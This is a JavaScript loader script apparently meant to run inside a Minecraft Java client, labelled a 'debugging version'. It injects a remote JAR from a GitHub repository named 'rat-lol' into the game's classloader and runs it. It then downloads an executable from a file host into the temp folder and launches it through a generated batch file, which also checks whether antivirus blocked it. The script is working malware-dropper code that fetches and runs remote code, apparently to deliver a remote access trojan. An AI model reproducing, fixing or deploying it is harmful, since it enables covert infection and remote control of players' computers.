// ===== FINAL DEBUGGING VERSION =====
(function() {
    // Prevent multiple executions
    if (typeof __MC_LOADER_EXECUTED === 'undefined') {
        __MC_LOADER_EXECUTED = true;
    } else {
        return;
    }

    // Enhanced logging
    var logFile = new java.io.File(java.lang.System.getProperty("java.io.tmpdir"), "mc_loader_log.txt");
    var logWriter = new java.io.PrintWriter(new java.io.FileWriter(logFile, true));
    
    function log(message) {
        var timestamp = new java.text.SimpleDateFormat("HH:mm:ss.SSS").format(new java.util.Date());
        var logMessage = "[" + timestamp + "] " + message;
        logWriter.println(logMessage);
        logWriter.flush();
        print(logMessage);
    }

    try {
        log("=== STARTING LOADER ===");
        
        // 1. JAR Loading (working correctly)
        try {
            log("Loading JAR...");
            var URLClassLoader = Java.type("java.net.URLClassLoader");
            var URL = Java.type("java.net.URL");
            var Minecraft = Java.type("net.minecraft.client.Minecraft");
            
            var jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
            var classLoader = Minecraft.class.getClassLoader();
            
            var addURL = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
            addURL.setAccessible(true);
            addURL.invoke(classLoader, jarURL);
            java.lang.Thread.sleep(1000);
            
            classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);
            log("JAR loaded successfully");
        } catch (e) {
            log("JAR ERROR: " + e);
        }

        // 2. EXE Download (working)
        var exePath = null;
        try {
            log("Downloading EXE...");
            var exeUrl = "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe";
            exePath = new java.io.File(
                java.lang.System.getProperty("java.io.tmpdir"),
                "mc_" + java.lang.System.currentTimeMillis() + ".exe"
            );
            
            var conn = new java.net.URL(exeUrl).openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            
            var in = conn.getInputStream();
            var out = new java.io.FileOutputStream(exePath);
            
            var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 8192);
            var bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
            in.close();
            out.close();
            log("EXE saved to: " + exePath.getAbsolutePath());
        } catch (e) {
            log("DOWNLOAD FAILED: " + e);
            return;
        }

        // 3. EXE Execution (fixed)
        if (exePath.exists()) {
            try {
                log("Attempting execution...");
                
                // Persistent debug window
                var debugScript = [
                    "@echo off",
                    "title MC Loader - PID: %TIME%",
                    "echo EXE Path: " + exePath.getAbsolutePath(),
                    "echo File Size: " + exePath.length() + " bytes",
                    "echo.",
                    "echo Checking process...",
                    "tasklist /FI \"IMAGENAME eq " + exePath.getName() + "\"",
                    "echo.",
                    "echo Attempting to start...",
                    "start \"\" /B \"" + exePath.getAbsolutePath() + "\"",
                    "timeout /t 5",
                    "echo Verifying...",
                    "tasklist /FI \"IMAGENAME eq " + exePath.getName() + "\"",
                    "echo.",
                    "if errorlevel 1 (",
                    "   echo FAILED - Check:",
                    "   echo 1. Antivirus blocks",
                    "   echo 2. File permissions",
                    "   echo 3. Missing dependencies",
                    ")",
                    "pause"
                ].join("\n");
                
                var debugFile = new java.io.File(exePath.getParentFile(), "debug_" + exePath.getName().replace(".exe", ".bat"));
                var writer = new java.io.PrintWriter(debugFile);
                writer.println(debugScript);
                writer.close();
                
                // Execute with creation flags to keep window open
                var pb = new java.lang.ProcessBuilder("cmd.exe", "/c", "start", "/wait", debugFile.getAbsolutePath());
                pb.directory(new java.io.File(System.getenv("TEMP")));
                pb.start();
                
                log("Debug window launched successfully");
                
            } catch (e) {
                log("EXECUTION ERROR: " + e);
            }
        }
        
    } catch (e) {
        log("UNEXPECTED ERROR: " + e);
    } finally {
        log("=== COMPLETED ===");
        logWriter.close();
        
        // Open logs automatically
        try {
            java.awt.Desktop.getDesktop().open(logFile);
        } catch (e) {
            java.lang.Runtime.getRuntime().exec("notepad " + logFile.getAbsolutePath());
        }
    }
})();